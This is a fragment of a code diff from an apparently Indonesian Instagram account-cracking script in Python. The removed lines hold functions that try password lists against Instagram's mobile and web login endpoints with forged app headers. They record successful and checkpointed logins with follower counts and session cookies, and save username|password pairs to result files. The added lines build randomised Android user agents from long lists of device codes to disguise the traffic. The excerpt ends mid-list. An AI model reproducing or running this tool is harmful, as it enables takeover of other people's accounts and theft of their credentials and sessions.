android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_fb_invite_entry_points,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"}','ig_sig_key_version': '4'}
-            ses.headers.update({
-                'X-Pigeon-Session-Id': str(uuid.uuid4()),
-                'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),
-                'X-IG-Connection-Speed': '-1kbps',
-                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
-                'X-IG-Bandwidth-TotalBytes-B': '0',
-                'X-IG-Bandwidth-TotalTime-MS': '0',
-                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
-                'X-IG-Connection-Type': 'MOBILE(LTE)',
-                'X-IG-Capabilities': '3brTvw==',
-                'X-IG-App-ID': '567067343352427',
-                'User-Agent': useragent,
-                'Accept-Language': 'id-ID, en-US',
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Accept-Encoding': 'gzip, deflate',
-                'Host': 'i.instagram.com',
-                'X-FB-HTTP-Engine': 'Liger',
-                'Connection': 'keep-alive',
-                'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
-            })
-            try:
-                _csrftoken = ses.cookies.get_dict()['csrftoken']
-            except Exception as e:
-                _csrftoken = ('')
-            ses.headers.update({'Cookie': ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),'Connection': 'keep-alive',})
-            data = (f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba\.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(_csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(str(password))}%22%2C%22login_attempt_count%22%3A%221%22%7D&ig_sig_key_version=4')
-            response2 = ses.post('https://i.instagram.com/api/v1/web/accounts/request_one_tap_login_nonce/',data=data, allow_redirects = True)
-            if 'logged_in_user' in str(response2.text) or 'sessionid' in ses.cookies.get_dict().keys():
-                Ok+=1
-                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
-                x_jason = x.json()["data"]["user"]
-                pengikut = x_jason["edge_followed_by"]["count"]
-                mengikut = x_jason["edge_follow"]["count"]
-                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
-                cookie = ";".join([key+"="+value.replace('"','') for key, value in s.cookies.get_dict().items()])
-                tree = Tree(Panel.fit(f"{H2}{username} {P2}| {H2}{password}"))
-                tree.add(Panel.fit(f"{P2}Followers : {H2}{pengikut}")).add(Panel.fit(f"{P2}Following : {H2}{mengikut}"))
-                tree.add(Panel.fit(f"{P2}Postingan : {H2}{postingan}"))
-                tree.add(Panel.fit(f"{N2}{cookie}{P2}"))
-                prints(tree)
-                open(f"result/success-{day}.txt","a").write(f'{username}|{password}|{pengikut}|{mengikut}\n')
-                break
-            elif 'challenge_required' in str(response2.text):
-                Cp+=1
-                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
-                x_jason = x.json()["data"]["user"]
-                pengikut = x_jason["edge_followed_by"]["count"]
-                mengikut = x_jason["edge_follow"]["count"]
-                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
-                tree = Tree("")
-                tree.add(Panel.fit(f"{K2}{username} {P2}| {K2}{password}"))
-                tree.add(f"{P2}Followers : {K2}{pengikut}")
-                tree.add(f"{P2}Following : {K2}{mengikut}")
-                tree.add(f"{P2}Postingan : {K2}{postingan}")
-                prints(tree)
-                open(f"result/checkpoint-{day}.txt","a").write(f'{username}|{password}|{pengikut}|{mengikut}\n')
-                break
-            else:
-                continue
-        #except Exception as e:print(e)
-        except requests.exceptions.ConnectionError:time.sleep(20)
-    Loop+=1
 
-def Crack_w(username, memek):
-    global Ok, Cp, Loop
-    ua = InstaIgeh()
-    sys.stdout.write(f"\r{Colors.BOLD}[Instagram App]{Colors.ENDC} {Colors.OKCYAN}[Proses: {Loop}/{len(Uuid)}/{Colors.OKCYAN}{str(username)[:6]}]{Colors.ENDC} Success: {Colors.OKGREEN}{Ok}{Colors.ENDC} Checkpoint: {Colors.WARNING}{Cp}{Colors.ENDC}"),
-    sys.stdout.flush()
-    try:
-        for pw in memek:
-            p = s.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/')
-            header = {
-                "Content-Type": "text/html; charset=utf-8",
-                "Allow": "POST",
-                "ig-set-password-encryption-web-key-id": "92",
-                "ig-set-password-encryption-web-pub-key": "7fe984d1d0cfc66e3ccf4b22b03c4935c4b9a4b8492baca12260a8345f11b67a",
-                "ig-set-password-encryption-web-key-version": "10",
-                "X-Robots-Tag": "noindex",
-                "Date": "Thu, 16 Jan 2025 01:48:16 GMT",
-                "Vary": "Accept-Language, Cookie",
-                "Content-Language": "en",
-                "Strict-Transport-Security": "max-age=31536000",
-                "Cache-Control": "private, no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "x-ig-snorlax-chunk-sleepms": "100",
-                "X-Frame-Options": "SAMEORIGIN",
-                "Content-Security-Policy": "HTTP/1.1",
-                "Cross-Origin-Embedder-Policy-Report-Only": "require-corp;report-to=\"coep\"",
-                "Report-To": "{\"group\":\"coop\",\"max_age\":2592000,\"endpoints\":[{\"url\":\"https://coop/\"}]}",
-                "Cross-Origin-Resource-Policy": "cross-origin",
-                "Cross-Origin-Opener-Policy": "same-origin-allow-popups;report-to=\"coop\"",
-                "X-Content-Type-Options": "nosniff",
-                "X-XSS-Protection": "0",
-                "x-ig-push-state": "c2",
-                "x-ig-cache-control": "no-cache",
-                "x-aed": "335",
-                "x-ig-request-elapsed-time-ms": "52",
-                "x-ig-peak-v2": "0",
-                "x-ig-peak-time": "1",
-                "x-stack": "distillery",
-                "x-perf-stats": "43057976;29258;51190",
-                "x-asbd-id":"129477",
-                "x-csrftoken": p.cookies.get_dict()['csrftoken'],
-                "x-ig-app-id":"936619743392459",
-                "x-ig-www-claim": "hmac.AR1JRO-r750XvzzKF-U-WVrXk1HS89qTOUcvnN6u9DpRZdOR",
-                "x-ig-device-id": p.cookies.get_dict()['ds_user_id'],
-                "X-IG-Connection-Type": "WIFI",
-                "X-IG-Bandwidth-Speed": "10000000",
-                "X-IG-Bandwidth-Total": "10000000",
-                "X-IG-Connection-Speed": "10000000",
-                "x-ig-origin-region": "cco",
-                "Proxy-Status": p.cookies.get_dict()['ig_pr'],
-            }
+def Android_Version(android_version):
+	if str(android_version) == '9':
+		return ('28')
+	elif str(android_version) == '10':
+		return ('29')
+	elif str(android_version) == '11':
+		return ('30')
+	elif str(android_version) == '12':
+		return ('31')
+	else:
+		return ('32')
 
-            data = {
-                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{random.randint(1000000000, 99999999999)}:{pw}",
-                "username": username,
-                "queryParams": "{}",
-                "optIntoOneTap": 'false',
-                "stopDeletionNonce": "",
-                "trustedDeviceRecords": "{}"}
-            respon= s.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = header, data = data, allow_redirects = False)
-            meledak_code = json.loads(respon.text)
-            if 'logged_in_user' in str(meledak_code) or 'href="https://i.instagram.com/accounts/onetap/?next=%2F"' in str(meledak_code) or 'sessionld' in str(meledak_code):
-                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
-                x_jason = x.json()["data"]["user"]
-                nama = x_jason["full_name"]
-                pengikut = x_jason["edge_followed_by"]["count"]
-                mengikut = x_jason["edge_follow"]["count"]
-                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
-                cookie = ";".join([key+"="+value.replace('"','') for key, value in s.cookies.get_dict().items()])
-                tree = Tree(Panel.fit(f"{H2}{username} {P2}| {H2}{pw}"))
-                tree.add(Panel.fit(f"{P2}Followers : {H2}{pengikut}")).add(Panel.fit(f"{P2}Following : {H2}{mengikut}"))
-                tree.add(Panel.fit(f"{P2}Postingan : {H2}{postingan}"))
-                tree.add(Panel.fit(f"{N2}{cookie}{P2}"))
-                prints(tree)
-                open(f"result/success-{day}.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
-                break
-            elif 'challenge_required' in str(meledak_code):
-                Ok+=1
-                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
-                x_jason = x.json()["data"]["user"]
-                nama = x_jason["full_name"]
-                pengikut = x_jason["edge_followed_by"]["count"]
-                mengikut = x_jason["edge_follow"]["count"]
-                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
-                tree = Tree("")
-                tree.add(Panel.fit(f"{K2}{username} {P2}| {K2}{pw}"))
-                tree.add(f"{P2}Followers : {K2}{pengikut}")
-                tree.add(f"{P2}Following : {K2}{mengikut}")
-                tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{ua}") 
-                prints(tree)
-                open(f"result/checkpoint-{day}.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
-                break
-            else:
-                continue
-        Loop+=1
-    except requests.ConnectionError:
-        time.sleep(10)
+def UserAgentBarcelona():
+	#; #
+	dpi_pixel = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
+	android_version = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
+	kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
+	igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0